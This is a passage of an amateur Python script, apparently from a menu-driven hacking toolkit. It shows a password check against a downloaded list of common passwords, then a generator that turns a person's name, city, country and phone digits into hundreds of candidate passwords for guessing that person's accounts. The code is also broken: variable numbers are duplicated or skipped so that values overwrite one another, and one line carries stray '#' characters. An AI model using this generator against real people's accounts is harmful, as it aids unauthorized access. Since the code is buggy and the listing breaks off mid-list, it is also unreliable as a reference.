    def bruteforce(guesspasswordlist, actual_password_hash):
        for guess_password in guesspasswordlist:
            if hash(guess_password) == actual_password_hash:
                print("Hey! your password is:", guess_password,
                    "\n please change this, it was really easy to guess it (:")
                # If the password is found then it will terminate the script here
                exit()
    
    url = 'https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top12Thousand-probable-v2.txt'
    pass_st = input("Enter password :==> ")
    actual_password = (pass_st )
    actual_password_hash = hash(actual_password)
    wordlist = readwordlist(url).decode('UTF-8')
    guesspasswordlist = wordlist.split('\n')
    # Running the Brute Force attack
    bruteforce(guesspasswordlist, actual_password_hash)
    # It would be executed if your password was not there in the wordlist
    print("Hey! I couldn't guess this password, it was not in my wordlist, this is good news! you win (: ")
######################################################################################################
elif option == 17:
   a = input("name: ==>")
   b = input("last name: ==>")
   c = input("city: ==>")
   d =input("contry: ==>")
   e = input("some word for full number phone: ==>")
   f = input("last 4 number phone: ==>")
#now start the password generate :)  
   g1 = a
   g2 = b
   g3 = c
   g4 = d
   g5 = e
   g6 = f
   g7 = a+a
   g8 = a+b
   g9 = a+c
   g10 = a+d
   g11 = a+e
   g12 = a+f
   g13 = b+a
   g14 = b+b
   g15 = b+c
   g16 = b+d
   g17 = b+e
   g18 = b+f
   g19 = c+a
   g20 = c+b
   g21 = c+c
   g22 = c+d
   g23 = c+e
   g24 = c+f
   g25 = d+a
   g26 = d+b
   g27 = d+c
   g28 = d+d
   g29 = d+e
   g30 = d+f
   g31 = e+a
   g32 = e+b
   g33 = e+c
   g34 = e+d
   g35 = e+e
   g36 = e+f
   g37 = f+a
   g38 = f+b
   g39 = f+c
   g40 = f+d
   g41 = f+e
   g42 = f+f
   g43 = a+a+a
   g44 = a+a+b
   g45 = a+a+c
   g46 = a+a+d
   g47 = a+a+e
   g48 = a+a+f
   g49 = a+b+a
   g50 = a+b+b
   g51 = a+b+c
   g52 = a+b+d
   g53 = a+b+e
   g53 = a+b+f
   g54 = a+c+a
   g55 = a+c+b
   g56 = a+c+c
   g57 = a+c+d
   g58 = a+c+e
   g59 = a+c+f
   g60 = a+d+a
   g61 = a+d+b
   g62 = a+d+c
   g63 = a+d+d
   g64 = a+d+e
   g65 = a+d+f
   g66 = a+e+a
   g67 = a+e+b
   g68 = a+e+c
   g69 = a+e+d
   g70 = a+e+e
   g71 = a+e+f
   g72 = a+f+a
   g73 = a+f+b
   g74 = a+f+c
   g75 = a+f+d
   g76 = a+f+e
   g77 = a+f+f
   g78 = b+a+a
   g79 = b+a+b
   g80 = b+a+c
   g81 = b+a+d
   g82 = b+a+e
   g83 = b+a+f
   g84 = b+b+a
   g85 = b+b+b
   g86 = b+b+c
   g87 = b+b+d
   g88 = b+b+e
   g89 = b+b+f
   g90 = b+c+a
   g91 = b+c+b
   g92 = b+c+c
   g93 = b+c+d
   g94 = b+c+e
   g95 = b+c+f
   g96 = b+d+a
   g97 = b+d+b
   g98 = b+d+c
   g99 = b+d+d
   g100 = b+d+e
   g101 = b+d+f
   g102 = b+e+a
   g103 = b+e+b
   g104 = b+e+c
   g105 = b+e+d
   g106 = b+e+e
   g107 = b+e+f
   g108 = b+f+a
   g109 = b+f+b
   g110 = b+f+c
   g111 = b+f+d
   g112 = b+f+e
   g113 = b+f+f
   g114 = c+a+a
   g115 = c+a+b
   g116 = c+a+c
   g117 = c+a+d
   g118 = c+a+e
   g119 = c+a+f
   g120 = c+b+a
   g121 = c+b+b
   g122 = c+b+c
   g123 = c+b+d
   g124 = c+b+e
   g125 = c+b+f
   g126 = c+c+a
   g127 = c+c+b
   g128 = c+c+c
   g129 = c+c+d
   g130 = c+c+e
   g131 = c+c+f
   g132 = c+d+a
   g133 = c+d+b
   g134 = c+d+c
   g135 = c+d+d
   g136 = c+d+e
   g137 = c+d+f
   g138 = c+e+a
   g139 = c+e+b
   g140 = c+e+c
   g141 = c+e+d
   g142 = c+e+e
   g143 = c+e+f
   g144 = c+f+a
   g145 = c+f+b
   g146 = c+f+c
   g147 = c+f+d
   g148 = c+f+e
   g149 = c+f+f
   g150 = d+a+a
   g151 = d+a+b
   g152 = d+a+c
   g153 = d+a+d
   g154 = d+a+e
   g155 = d+a+f
   g156 = d+b+a
   g157 = d+b+b
   g158 = d+b+c
   g159 = d+b+d
   g160 = d+b+e
   g161 = d+b+f
   g162 = d+c+a
   g163 = d+c+b
   g164 = d+c+c
   g165 = d+c+d
   g166 = d+c+e
   g167 = d+c+f
   g168 = d+d+a
   g169 = d+d+b
   g170 = d+d+c
   g171 = d+d+d
   g172 = d+d+e
   g173 = d+d+f
   g174 = d+e+a
   g175 = d+e+b
   g176 = d+e+c
   g177 = d+e+d
   g178 = d+e+e
   g179 = d+e+f
   g180 = d+f+a
   g181 = d+f+b
   g182 = d+f+c
   g183 = d+f+d
   g184 = d+f+e
   g185 = d+f+f
   g186 = e+a+a
   g187 = e+a+b
   g189 = e+a+c
   g190 = e+a+d
   g191 = e+a+e
   g192 = e+a+f
   g193 = e+b+a
   g194 = e+b+b
   g195 = e+b+c
   g196 = e+b+d
   g197 = e+b+e
   g198 = e+b+f
   g199 = e+c+a
   g200 = e+c+b
   g201 = e+c+c
   g202 = e+c+d
   g203 = e+c+e
   g204 = e+c+f
   g205 = e+d+a
   g206 = e+d+b
   g207 = e+d+c
   g208 = e+d+d
   g209 = e+d+e
   g210 = e+d+f
   g211 = e+e+a
   g212 = e+e+b
   g213 = e+e+c
   g214 = e+e+d
   g215 = e+e+e
   g216 = e+e+f
   g217 = e+f+a
   g218 = e+f+b
   g219 = e+f+c
   g220 = e+f+d
   g221 = e+f+e
   g222 = e+f+f
   g223 = f+a+a
   g224 = f+a+b
   g225 = f+a+c
   g226 = f+a+d
   g227 = f+a+e
   g228 = f+a+f
   g229 = f+b+a
   g230 = f+b+b
   g231 = f+b+c
   g232 = f+b+d
   g233 = f+b+e
   g234 = f+b+f
   g235 = f+c+a
   g236 = f+c+b
   g237 = f+c+c
   g238 = f+c+d
   g239 = f+c+e
   g240 = f+c+f
   g241 = f+d+a
   g242 = f+d+b
   g243 = f+d+c
   g244 = f+d+d
   g245 = f+d+e
   g246 = f+d+f
   g247 = f+e+a
   g248 = f+e+b
   g249 = f+e+c
   g250 = f+e+d
   g251 = f+e+e
   g252 = f+e+f
   g253 = f+f+a
   g254 = f+f+b
   g255 = f+f+c
   g256 = f+f+d
   g257 = f+f+e
   g258 = f+f+f
   g259 = a+a+a+a
   g260 = a+a+a+b 
   g261 = a+a+a+c
   g262 = a+a+a+d
   g263 = a+a+a+e
   g264 = a+a+a+f
   g265 = a+a+b+a
   g266 = a+a+b+b
   g267 = a+a+b+c
   g268 = a+a+b+d
   g269 = a+a+b+e
   g270 = a+a+b+f
   g271 = a+a+c+a
   g272 = a+a+c+b
   g273 = a+a+c+c
   g274 = a+a+c+d
   g275 = a+a+c+e
   g276 = a+a+c+f
   g277 = a+a+d+a
   g278 = a+a+d+b
   g279 = a+a+d+c
   g280 = a+a+d+d
   g281 = a+a+d+e
   g282 = a+a+d+f
   g283 = a+a+e+a
   g284 = a+a+e+b
   g285 = a+a+e+c
   g286 = a+a+e+d
   g287 = a+a+e+e
   g288 = a+a+e+f
   g289 = a+a+f+a
   g290 = a+a+f+b
   g291 = a+a+f+c
   g292 = a+a+f+d
   g293 = a+a+f+e
   g294 = a+a+f+f
   g295 = a+b+a+a
   g296 = a+b+a+b
   g297 = a+b+a+c
   g298 = a+b+a+d
   g299 = a+b+a+e
   g300 = a+b+a+f
   g301 = a+b+b+a
   g302 = a+b+b+b
   g303 = a+b+b+c
   g304 = a+b+b+d
   g305 = a+b+b+e
   g306 = a+b+b+f
   g307 = a+b+c+a
   g308 = a+b+c+b
   g309 = a+b+c+c
   g310 = a+b+c+d
   g311 = a+b+c+e
   g312 = a+b+c+f
   g313 = a+b+d+a
   g314 = a+b+d+b
   g315 = a+b+d+c
   g316 = a+b+d+d
   g317 = a+b+d+e
   g318 = a+b+d+f
   g319 = a+b+e+a
   g320 = a+b+e+b
   g321 = a+b+e+c
   g322 = a+b+e+d
   g323 = a+b+e+e
   g324 = a+b+e+f
   g325 = a+b+f+a
   g326 = a+b+f+b
   g327 = a+b+f+c
   g328 = a+b+f+d
   g329 = a+b+f+e
   g330 = a+b+f+f
   g331 = a+c+a+a
   g332 = a+c+a+b
   g333 = a+c+a+c
   g334 = a+c+a+d
   g335 = a+c+a+e
   g336 = a+c+a+f
   g337 = a+c+b+a
   g338 = a+c+b+b
   g339 = a+c+b+c
   g340 = a+c+b+d
   g341 = a+c+b+e
   g342 = a+c+b+f
   g343 = a+c+c+a
   g344 = a+c+c+b
   g345 = a+c+c+c
   g346 = a+c+c+d
   g347 = a+c+c+e
   g348 = a+c+c+f
   g349 = a+c+d+a
   g350 = a+c+d+b
   g351 = a+c+d+c
   g352 = a+c+d+d
   g353 = a+c+d+e
   g354 = a+c+d+f
   g355 = a+c+e+a
   g356 = a+c+e+b
   g357 = a+c+e+c
   g358 = a+c+e+d
   g359 = a+c+e+e
   g360 = a+c+e+f
   g361 = a+c+f+a
   g362 = a+c+f+b
   g363 = a+c+f+c
   g364 = a+c+f+d
   g365 = a+c+f+e
   g366 = a+c+f+f
   g367 = a+d+a+a
   g368 = a+d+a+b
   g369 = a+d+a+c
   g370 = a+d+a+d
   g371 = a+d+a+e
   g372 = a+d+a+f
   g373 = a+d+b+a
   g374 = a+d+b+b
   g375 = a+d+b+c
   g376 = a+d+b+d
   g377 = a+d+b+e
   g378 = a+d+b+f
   g379 = a+d+c+a
   g380 = a+d+c+b
   g381 = a+d+c+c
   g382 = a+d+c+d
   g383 = a+d+c+e
   g384 = a+d+c+f
   g385 = a+d+d+a
   g386 = a+d+d+b
   g387 = a+d+d+c
   g388 = a+d+d+d
   g389 = a+d+d+e
   g390 = a+d+d+f
   g391 = a+d+e+a
   g392 = a+d+e+b
   g393 = a+d+e+c
   g394 = a+d+e+d
   g395 = a+d+e+e
   g356 = a+d+e+f
   g357 = a+d+f+a
   g358 = a+d+f+b
   g359 = a+d+f+c
   g360 = a+d+f+d
   g361 = a+d+f+e
   g362 = a+d+f+f
   g363 = a+e+a+a
   g364 = a+e+a+b
   g365 = a+e+a+c
   g366 = a+e+a+d
   g367 = a+e+a+e
   g368 = a+e+a+f
   g369 = a+e+b+a
   g370 = a+e+b+b
   g371 = a+e+b+c
   g372 = a+e+b+d
   g373 = a+e+b+e
   g374 = a+e+b+f
   g375 = a+e+c+a
   g376 = a+e+c+b
   g377 = a+e+c+c
   g378 = a+e+c+d
   g379 = a+e+c+e
   g380 = a+e+c+f
   g381 = a+e+d+a
   g382 = a+e+d+b
   g383 = a+e+d+c
   g384 = a+e+d+d
   g385 = a+e+d+e
   g386 = a+e+d+f
   g387 = a+e+e+a
   g388 = a+e+e+b
   g389 = a+e+e+c
   g390 = a+e+e+d
   g391 = a+e+e+e
   g392 = a+e+e+f
   g393 = a+e+f+a
   g394 = a+e+f+b
   g395 = a+e+f+c
   g396 = a+e+f+d
   g397 = a+e+f+e
   g398 = a+e+f+f
   g399 = a+f+a+a
   g400 = a+f+a+b
   g401 = a+f+a+c
   g402 = a+f+a+d
   g403 = a+f+a+e
   g404 = a+f+a+f
   g405 = a+f+b+a
   g406 = a+f+b+b
   g407 = a+f+b+c
   g408 = a+f+b+d
   g409 = a+f+b+e
   g410 = a+f+b+f
   g411 = a+f+c+a
   g412 = a+f+c+b
   g413 = a+f+c+c
   g414 = a+f+c+d
   g415 = a+f+c+e
   g416 = a+f+c+f
   g417 = a+f+d+a
   g418 = a+f+d+b
   g419 = a+f+d+c
   g420 = a+f+d+d
   g421 = a+f+d+e
   g422 = a+f+d+f
   g423 = a+f+e+a
   g424 = a+f+e+b
   g425 = a+f+e+c
   g426 = a+f+e+d
   g427 = a+f+e+e
   g428 = a+f+e+f
   g429 = a+f+f+a
   g430 = a+f+f+b
   g431 = a+f+f+c
   g432 = a+f+f+d
   g433 = a+f+f+e
   g434 = a+f+f+f
   g435 = b+a+a+a
   g436 = b+a+a+b
   g437 = b+a+a+c
   g438 = b+a+a+d
   g439 = b+a+a+e
   g440 = b+a+a+f
   g441 = b+a+b+a
   g442 = b+a+b+b
   g443 = b+a+b+c
   g444 = b+a+b+d
   g445 = b+a+b+e
   g446 = b+a+b+f
   g447 = b+a+c+a
   g448 = b+a+c+b
   g449 = b+a+c+c
   g500 = b+a+c+d
   g501 = b+a+c+e
   g502 = b+a+c+f
   g503 = b+a+d+a
   g504 = b+a+d+b
   g505 = b+a+d+c
   g506 = b+a+d+d
   g507 = b+a+d+e
   g508 = b+a+d+f
   g509 = b+a+e+a
   g510 = b+a+e+b
   g511 = b+a+e+c
   g512 = b+a+e+d
   g513 = b+a+e+e
   g514 = b+a+e+f
   g515 = b+a+f+a
   g516 = b+a+f+b
   g517 = b+a+f+c
   g518 = b+a+f+d
   g519 = b+a+f+e
   g520 = b+a+f+f
   g521 = b+b+a+a
   g522 = b+b+a+b
   g523 = b+b+a+c
   g524 = b+b+a+d
   g525 = b+b+a+e
   g525 = b+b+a+f
   g526 = b+b+b+a
   g527 = b+b+b+b
   g528 = b+b+b+c
   g529 = b+b+b+d
   g530 = b+b+b+e
   g531 = b+b+b+f
   g532 = b+b+c+a
   g533 = b+b+c+b
   g534 = b+b+c+c
   g535 = b+b+c+d
   g536 = b+b+c+e
   g527 = b+b+c+f
   g528 = b+b+d+a
   g529 = b+b+d+b
   g530 = b+b+d+c
   g531 = b+b+d+d
   g532 = b+b+d+e
   g533 = b+b+d+f
   g534 = b+b+e+a
   g535 = b+b+e+b
   g536 = b+b+e+c
   g537 = b+b+e+d
   g538 = b+b+e+e
   g539 = b+b+e+f
   g540 = b+b+f+a
   g541 = b+b+f+b
   g542 = b+b+f+c
   g513 = b+b+f+d
   g514 = b+b+f+e
   g515 = b+b+f+f
   g516 = b+c+a+a
   g517 = b+c+a+b
   g518 = b+c+a+c
   g519 = b+c+a+d
   g520 = b+c+a+e
   g521 = b+c+a+f
   g522 = b+c+b+a
   g523 = b+c+b+b
   g524 = b+c+b+c
   g525 = b+c+b+d
   g526 = b+c+b+e
   g527 = b+c+b+f
   g528 = b+c+c+a
   g529 = b+c+c+b
   g530 = b+c+c+c
   g531 = b+c+c+d
   g532 = b+c+c+e
   g533 = b+c+c+f
   g534 = b+c+d+a
   g535 = b+c+d+b
   g536 = b+c+d+c
   g537 = b+c+d+d
   g538 = b+c+d+e
   g539 = b+c+d+f
   g540 = b+c+e+a
   g541 = b+c+e+b
   g542 = b+c+e+c
   g543 = b+c+e+d
   g544 = b+c+e+e
   g545 = b+c+e+f
   g546 = b+c+f+a
   g547 = b+c+f+b
   g548 = b+c+f+c
   g549 = b+c+f+d
   g550 = b+c+f+e
   g551 = b+c+f+f
   g552 = b+d+a+a
   g553 = b+d+a+b
   g554 = b+d+a+c
   g555 = b+d+a+d
   g556 = b+d+a+e
   g557 = b+d+a+f
   g558 = b+d+b+a
   g559 = b+d+b+b
   g560 = b+d+b+c
   g561 = b+d+b+d
   g562 = b+d+b+e
   g563 = b+d+b+f
   g564 = b+d+c+a
   g565 = b+d+c+b
   g566 = b+d+c+c
   g567 = b+d+c+d
   g568 = b+d+c+e
   g569 = b+d+c+f
   g570 = b+d+d+a
   g571 = b+d+d+b
   g572 = b+d+d+c
   g573 = b+d+d+d
   g574 = b+d+d+e
   g575 = b+d+d+f
   g576 = b+d+e+a
   g577 = b+d+e+b
   g578 = b+d+e+c
   g579 = b+d+e+d
   g580 = b+d+e+e
   g581 = b+d+e+f
   g582 = b+d+f+a
   g583 = b+d+f+b
   g584 = b+d+f+c
   g585 = b+d+f+d
   g586 = b+d+f+e
   g587 = b+d+f+f
   g588 = b+e+a+a
   g589 = b+e+a+b
   g590 = b+e+a+c
   g591 = b+e+a+d
   g592 = b+e+a+e
   g593 = b+e+a+f
   g594 = b+e+b+a
   g595 = b+e+b+b
   g596 = b+e+b+c
   g597 = b+e+b+d
   g598 = b+e+b+e
   g599 = b+e+b+f
   g600 = b+e+c+a
   g601 = b+e+c+b
   g602 = b+e+c+c
   g603 = b+e+c+d
   g604 = b+e+c+e
   g605 = b+e+c+f
   g606 = b+e+d+a
   g607 = b+e+d+b
   g608 = b+e+d+c
   g609 = b+e+d+d
   g610 = b+e+d+e
   g611 = b+e+d+f
   g612 = b+e+e+a
   g613 = b+e+e+b
   g614 = b+e+e+c
   g615 = b+e+e+d
   g616 = b+e+e+e
   g617 = b+e+e+f
   g618 = b+e+f+a
   g619 = b+e+f+b
   g620 = b+e+f+c
   g621 = b+e+f+d
   g622 = b+e+f+e
   g623 = b+e+f+f
   g624 = b+f+a+a
   g625 = b+f+a+b
   g626 = b+f+a+c
   g627 = b+f+a+d
   g628 = b+f+a+e
   g629 = b+f+a+f
   g630 = b+f+b+a
   g631 = b+f+b+b
   g632 = b+f+b+c
   g633 = b+f+b+d
   g634 = b+f+b+e
   g635 = b+f+b+f
   g636 = b+f+c+a
   g637 = b+f+c+b
   g638 = b+f+c+c
   g639 = b+f+c+d
   g640 = b+f+c+e
   g641 = b+f+c+f
   g642 = b+f+d+a
   g643 = b+f+d+b
   g644 = b+f+d+c
   g645 = b+f+d+d
   g646 = b+f+d+e
   g647 = b+f+d+f
   g648 = b+f+e+a
   g649 = b+f+e+b
   g650 = b+f+e+c
   g651 = b+f+e+d
   g652 = b+f+e+e
   g653 = b+f+e+f
   g654 = b+f+f+a
   g655 = b+f+f+b
   g656 = b+f+f+c
   g657 = b+f+f+d
   g658 = b+f+f+e
   g659 = b+f+f+f
   g660 = c+a+a+a
   g661 = c+a+a+b
   g662 = c+a+a+c
   g663 = c+a+a+d
   g664 = c+a+a+e
   g665 = c+a+a+f
   g666 = c+a+b+a
   g667 = c+a+b+b
   g668 = c+a+b+c
   g669 = c+a+b+d
   g670 = c+a+b+e
   g671 = c+a+b+f
   g672 = c+a+c+a
   g673 = c+a+c+b
   g674 = c+a+c+c
   g675 = c+a+c+d
   g676 = c+a+c+e
   g677 = c+a+c+f
   g678 = c+a+d+a
   g679 = c+a+d+b
   g680 = c+a+d+c
   g681 = c+a+d+d
   g682 = c+a+d+e
   g683 = c+a+d+f
   g684 = c+a+e+a
   g685 = c+a+e+b
   g686 = c+a+e+c
   g687 = c+a+e+d
   g678 = c+a+e+e
   g679 = c+a+e+f
   g680 = c+a+f+a
   g681 = c+a+f+b
   g682 = c+a+f+c
   g683 = c+a+f+d
   g684 = c+a+f+e
   g685 = c+a+f+f
   g686 = c+b+a+a
   g687 = c+b+a+b
   g688 = c+b+a+c
   g689 = c+b+a+d
   g690 = c+b+a+e
   g691 = c+b+a+f
   g692 = c+b+b+a
   g693 = c+b+b+b
   g694 = c+b+b+c
   g695 = c+b+b+d
   g696 = c+b+b+e
   g697 = c+b+b+f
   g698 = c+b+c+a
   g699 = c+b+c+b
   g700 = c+b+c+c
   g701 = c+b+c+d
   g702 = c+b+c+e
   g703 = c+b+c+f
   g704 = c+b+d+a
   g705 = c+b+d+b
   g706 = c+b+d+c
   g707 = c+b+d+d
   g708 = c+b+d+e
   g709 = c+b+d+f
   g710 = c+b+e+a
   g711 = c+b+e+b
   g712 = c+b+e+c
   g713 = c+b+e+d
   g714 = c+b+e+e
   g715 = c+b+e+f
   g716 = c+b+f+a
   g717 = c+b+f+b
   g718 = c+b+f+c
   g719 = c+b+f+d
   g720 = c+b+f+e
   g721 = c+b+f+f
   g722 = c+c+a+a
   g723 = c+c+a+b
   g724 = c+c+a+c
   g725 = c+c+a+d
   g726 = c+c+a+e
   g727 =c+c+a+f
   g728 = c+c+b+a
   g729 = c+c+b+b
   g730 = c+c+b+c
   g731 = c+c+b+d
   g732 = c+c+b+e
   g733 = c+c+b+f
   g734 = c+c+c+a
   g735 = c+c+c+b
   g736 = c+c+c+c
   g737 = c+c+c+d
   g738 = c+c+c+e
   g739 = c+c+c+f
   g740 = c+c+d+a
   g741 = c+c+d+b
   g742 = c+c+d+c
   g743 = c+c+d+d
   g744 = c+c+d+e
   g745 = c+c+d+f
   g746 = c+c+e+a
   g747 = c+c+e+b
   g748 = c+c+e+c
   g749 = c+c+e+d
   g750 = c+c+e+e
   g751 = c+c+e+f
   g752 = c+c+f+a
   g753 = c+c+f+b
   g754 = c+c+f+c
   g755 = c+c+f+d
   g756 = c+c+f+e
   g757 = c+c+f+f
   g758 = c+d+a+a
   g759 = c+d+a+b
   g760 = c+d+a+c
   g761 = c+d+a+d
   g762 = c+d+a+e
   g763 = c+d+a+f
   g764 = c+d+b+a
   g765 = c+d+b+b
   g766 = c+d+b+c
   g767 = c+d+b+d
   g768 = c+d+b+e
   g769 = c+d+b+f
   g770 = c+d+c+a
   g771 = c+d+c+b
   g772 = c+d+c+c
   g773 = c+d+c+d
   g774 = c+d+c+e
   g775 = c+d+c+f
   g776 = c+d+d+a
   g777 = c+d+d+b
   g778 = c+d+d+c
   g779 = c+d+d+d
   g780 = c+d+d+e
   g781 = c+d+d+f
   g782 = c+d+e+a
   g783 = c+d+e+b
   g784 = c+d+e+c
   g785 = c+d+e+d
   g786 = c+d+e+e
   g787 = c+d+e+f
   g788 = c+d+f+a
   g789 = c+d+f+b
   g790 = c+d+f+c
   g791 = c+d+f+d
   g792 = c+d+f+e
   g793 = c+d+f+f
   g794 = c+e+a+a
   g795 = c+e+a+b
   g796 = c+e+a+c
   g797 = c+e+a+d
   g798 = c+e+a+e
   g799 = c+e+a+f
   g800 = c+e+b+a
   g801 = c+e+b+b
   g802 = c+e+b+c
   g803 = c+e+b+d
   g804 = c+e+b+e
   g805 = c+e+b+f
   g806 = c+e+c+a
   g807 = c+e+c+b
   g808 = c+e+c+c
   g809 = c+e+c+d
   g810 = c+e+c+e
   g811 = c+e+c+f
   g812 = c+e+d+a
   g813 = c+e+d+b
   g814 = c+e+d+c
   g815 = c+e+d+d
   g816 = c+e+d+e
   g817 = c+e+d+f
   g818 = c+e+e+a
   g819 = c+e+e+b
   g820 = c+e+e+c
   g821 = c+e+e+d
   g822 = c+e+e+e
   g823 = c+e+e+f
   g824 = c+e+f+a
   g825 = c+e+f+b
   g826 = c+e+f+c
   g827 = c+e+f+d
   g828 = c+e+f+e
   g829 = c+e+f+f
   g830 = c+f+a+a
   g831 = c+f+a+b
   g832 = c+f+a+c
   g833 = c+f+a+d
   g834 = c+f+a+e
   g835 = c+f+a+f
   g826 = c+f+b+a
   g827 = c+f+b+b
   g828 = c+f+b+c
   g829 = c+f+b+d
   g830 = c+f+b+e
   g831 = c+f+b+f
   g832 = c+f+c+a
   g833 = c+f+c+b
   g834 = c+f+c+c
   g835 = c+f+c+d
   g836 = c+f+c+e
   g837 = c+f+c+f
   g838 = c+f+d+a
   g839 = c+f+d+b
   g840 = c+f+d+c
   g841 = c+f+d+d
   g842 = c+f+d+e
   g843 = c+f+d+f
   g844 = c+f+e+a
   g845 = c+f+e+b
   g846 = c+f+e+c
   g847 = c+f+e+d
   g848 = c+f+e+e
   g849 = c+f+e+f
   g850 = c+f+f+a
   g851 = c+f+f+b
   g852 = c+f+f+c
   g853 = c+f+f+d
   g854 = c+f+f+e
   g855 = c+f+f+f
   g856 = d+a+a+a
   g857 = d+a+a+b
   g858 = d+a+a+c
   g859 = d+a+a+d
   g860 = d+a+a+e
   g861 = d+a+a+f
   g862 = d+a+b+a
   g863 = d+a+b+b
   g864 = d+a+b+c
   g865 = d+a+b+d
   g866 = d+a+b+e
   g867 = d+a+b+f
   g868 = d+a+c+a
   g869 = d+a+c+b
   g870 = d+a+c+c
   g871 = d+a+c+d
   g872 = d+a+c+e
   g873 = d+a+c+f
   g874 = d+a+d+a
   g885 = d+a+d+b
   g886 = d+a+d+c
   g887 = d+a+d+d
   g888 = d+a+d+e
   g889 = d+a+d+f
   g890 = d+a+e+a
   g891 = d+a+e+b
   g892 = d+a+e+c
   g893 = d+a+e+d
   g894 = d+a+e+e
   g895 = d+a+e+f
   g896 = d+a+f+a
   g897 = d+a+f+b
   g898 = d+a+f+c
   g899 = d+a+f+d
   g900 = d+a+f+e
   g901 = d+a+f+f
   g902 = d+b+a+a
   g903 = d+b+a+b
   g904 = d+b+a+c
   g905 = d+b+a+d
   g906 = d+b+a+e
   g907 = d+b+a+f
   g908 = d+b+b+a
   g909 = d+b+b+b
   g910 = d+b+b+c
   g911 = d+b+b+d
   g912 = d+b+b+e
   g913 = d+b+b+f
   g914 = d+b+c+a
   g915 = d+b+c+b
   g916 = d+b+c+c
   g917 = d+b+c+d
   g918 = d+b+c+e
   g919 = d+b+c+f
   g920 = d+b+d+a
   g921 = d+b+d+b
   g922 = d+b+d+c
   g923 = d+b+d+d
   g924 = d+b+d+e
   g925 = d+b+d+f
   g926 = d+b+e+a
   g927 = d+b+e+b
   g928 = d+b+e+c
   g929 = d+b+e+d
   g930 = d+b+e+e
   g931 = d+b+e+f
   g932 = d+b+f+a
   g933 = d+b+f+b
   g934 = d+b+f+c
   g935 = d+b+f+d
   g936 = d+b+f+e
   g937 = d+b+f+f
   g938 = d+c+a+a
   g939 = d+c+a+b
   g940 = d+c+a+c
   g941 = d+c+a+d
   g942 = d+c+a+e
   g943 = d+c+a+f
   g944 = d+c+b+a
   g945 = d+c+b+b
   g946 = d+c+b+c
   g947 = d+c+b+d
   g948 = d+c+b+e
   g949 = d+c+b+f
   g950 = d+c+c+a
   g951 = d+c+c+b
   g952 = d+c+c+c
   g953 = d+c+c+d
   g954 = d+c+c+e
   g955 = d+c+c+f
   g956 = d+c+d+a
   g957 = d+c+d+b
   g958 = d+c+d+c
   g959 = d+c+d+d################
   g960 = d+c+d+e
   g961 = d+c+d+f
   g962 = d+c+e+a
   g963 = d+c+e+b
   g964 = d+c+e+c
   g965 = d+c+e+d
   g966 = d+c+e+e
   g967 = d+c+e+f
   g968 = d+c+f+a
   g969 = d+c+f+b
   g969 = d+c+f+c
   g970 = d+c+f+d
   g971 = d+c+f+e
   g972 = d+c+f+f
   g973 = d+d+a+a
   g974 = d+d+a+b
   g975 = d+d+a+c
   g976 = d+d+a+d
   g977 = d+d+a+e
   g978 = d+d+a+f
   g979 = d+d+b+a
   g980 = d+d+b+b
   g981 = d+d+b+c
   g982 = d+d+b+d
   g983 = d+d+b+e
   g984 = d+d+b+f
   g985 = d+d+c+a
   g986 = d+d+c+b
   g987 = d+d+c+c
   g988 = d+d+c+d
   g989 = d+d+c+e
   g990 = d+d+c+f
   g991 = d+d+d+a
   g992 = d+d+d+b
   g993 = d+d+d+c
   g994 = d+d+d+d
   g995 = d+d+d+e
   g996 = d+d+d+f
   g997 = d+d+e+a
   g998 = d+d+e+b
   g999 = d+d+e+c
   g1000 = d+d+e+d
   g1001 = d+d+e+e
   g1002 = d+d+e+f
   g1003 = d+d+f+a
   g1004 = d+d+f+b
   g1005 = d+d+f+c
   g1006 = d+d+f+d
   g1007 = d+d+f+e
   g1008 = d+d+f+f
   g1009 = d+e+a+a
   g1010 = d+e+a+b
   g1011 = d+e+a+c
   g1012 = d+e+a+d
   g1013 = d+e+a+e
   g1014 = d+e+a+f
   g1015 = d+e+b+a
   g1016 = d+e+b+b
   g1017 = d+e+b+c
   g1018 = d+e+b+d
   g1019 = d+e+b+e
   g1020 = d+e+b+f
   g1021 = d+e+c+a
   g1022 = d+e+c+b
   g1023 = d+e+c+c
   g1024 = d+e+c+d
   g1025 = d+e+c+e
   g1026 = d+e+c+f
   g1027 = d+e+d+a
   g1028 = d+e+d+b
   g1029 = d+e+d+c
   g1030 = d+e+d+d
   g1031 = d+e+d+e
   g1032 = d+e+d+f
   g1033 = d+e+e+a
   g1034 = d+e+e+b
   g1035 = d+e+e+c
   g1036 = d+e+e+d
   g1037 = d+e+e+e
   g1038 = d+e+e+f
   g1039 = d+e+f+a
   g1040 = d+e+f+b
   g1041 = d+e+f+c
   g1042 = d+e+f+d
   g1043 = d+e+f+e
   g1044 = d+e+f+f
   g1045 = d+f+a+a
   g1046 = d+f+a+b
   g1047 = d+f+a+c
   g1048 = d+f+a+d
   g1049 = d+f+a+e
   g1050 = d+f+a+f
   g1051 = d+f+b+a
   g1052 = d+f+b+b
   g1053 = d+f+b+c
   g1054 = d+f+b+d
   g1055 = d+f+b+e
   g1056 = d+f+b+f
   g1057 = d+f+c+a
   g1058 = d+f+c+b
   g1059 = d+f+c+c
   g1060 = d+f+c+d
   g1061 = d+f+c+e
   g1062 = d+f+c+f
   g1063 = d+f+d+a
   g1064 = d+f+d+b
   g1065 = d+f+d+c
   g1067 = d+f+d+d
   g1068 = d+f+d+e
   g1069 = d+f+d+f
   g1070 = d+f+e+a
   g1071 = d+f+e+b
   g1072 = d+f+e+c
   g1073 = d+f+e+d
   g1074 = d+f+e+e
   g1075 = d+f+e+f
   g1076 = d+f+f+a
   g1077 = d+f+f+b
   g1078 = d+f+f+c
   g1079 = d+f+f+d
   g1080 = d+f+f+e
   g1081 = d+f+f+f
   g1082 = e+a+a+a
   g1083 = e+a+a+b
   g1084 = e+a+a+c
   g1085 = e+a+a+d
   g1086 = e+a+a+e
   g1087 = e+a+a+f
   g1088 = e+a+b+a
   g1089 = e+a+b+b
   g1090 = e+a+b+c
   g1091 = e+a+b+d
   g1092 = e+a+b+e
   g1093 = e+a+b+f
   g1094 = e+a+c+a
   g1095 = e+a+c+b
   g1096 = e+a+c+c
   g1097 = e+a+c+d
   g1098 = e+a+c+e
   g1099 = e+a+c+f
   g1100 = e+a+d+a
   g1101 = e+a+d+b
   g1102 = e+a+d+c
   g1103 = e+a+d+d
   g1104 = e+a+d+e
   g1105 = e+a+d+f
   g1106 = e+a+e+a
   g1107 = e+a+e+b
   g1108 = e+a+e+c
   g1109 = e+a+e+d
   g1110 = e+a+e+e
   g1111 = e+a+e+f
   g1112 = e+a+f+a
   g1113 = e+a+f+b
